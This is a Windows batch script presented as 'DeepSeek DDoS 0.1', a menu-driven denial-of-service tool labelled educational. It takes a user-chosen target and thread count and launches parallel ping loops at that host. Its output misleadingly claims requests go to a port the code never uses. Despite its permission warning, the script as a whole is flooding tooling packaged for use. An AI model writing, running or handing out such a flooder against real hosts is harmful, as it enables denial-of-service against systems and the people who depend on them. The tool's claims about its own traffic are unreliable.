@echo off
title DeepSeek DDoS 0.1 - EDUCATIONAL NETWORK TOOL
color 0c
cls

:: ============================================
:: DEEPSEEK DDoS 0.1 (EDUCATIONAL VERSION)
:: This is a conceptual demonstration of batch scripting
:: for legitimate network learning purposes ONLY
:: ============================================

set "target=127.0.0.1"
set "port=80"
set "threads=5"
set "requests=100"

:menu
cls
echo ========================================
echo   DEEPSEEK DDoS 0.1 - EDUCATIONAL TOOL
echo ========================================
echo.
echo 1. Set Target IP/Host
echo 2. Set Port
echo 3. Set Number of Threads
echo 4. Set Number of Requests
echo 5. Start Test
echo 6. Exit
echo.
echo Current Settings:
echo   Target: %target%
echo   Port:   %port%
echo   Threads: %threads%
echo   Requests: %requests%
echo.
set /p choice="Select option: "

if "%choice%"=="1" goto settarget
if "%choice%"=="2" goto setport
if "%choice%"=="3" goto setthreads
if "%choice%"=="4" goto setrequests
if "%choice%"=="5" goto starttest
if "%choice%"=="6" exit
goto menu

:settarget
cls
set /p target="Enter target IP or hostname: "
goto menu

:setport
cls
set /p port="Enter port number (default 80): "
goto menu

:setthreads
cls
set /p threads="Enter number of threads (1-20): "
goto menu

:setrequests
cls
set /p requests="Enter requests per thread: "
goto menu

:starttest
cls
echo ========================================
echo   DEEPSEEK DDoS 0.1 - RUNNING TEST
echo ========================================
echo.
echo Target: %target%
echo Port:   %port%
echo Threads: %threads%
echo Requests per thread: %requests%
echo.
echo [WARNING] This is an educational demonstration
echo Use only on systems you own or have explicit
echo permission to test. Unauthorized network
echo testing is illegal in most jurisdictions.
echo.
set /p confirm="Proceed with educational test? (y/n): "
if /i not "%confirm%"=="y" goto menu

:: Create temporary batch files for each thread
set "scriptdir=%temp%\deepseek_test"
if not exist "%scriptdir%" mkdir "%scriptdir%"

echo Launching educational test threads...
set "completed=0"

for /l %%t in (1,1,%threads%) do (
    echo Starting virtual thread %%t...
    (
        echo @echo off
        echo for /l %%%%i in (1,1,%requests%) do (
        echo   ping -n 1 -w 100 %target% ^>nul 2^>^&1
        echo   echo [Thread %%t] Request %%%%i sent to %target%:%port%
        echo )
        echo echo [Thread %%t] Completed all requests
    ) > "%scriptdir%\thread_%%t.bat"
)

echo.
echo Starting %threads% virtual threads...
echo Press Ctrl+C to stop
echo.

for /l %%t in (1,1,%threads%) do (
    start /b cmd /c "%scriptdir%\thread_%%t.bat"
)

echo All threads launched. Monitor output above.
echo.
echo Press any key to return to menu when done.
pause >nul

:: Cleanup
rd /s /q "%scriptdir%" 2>nul
goto menu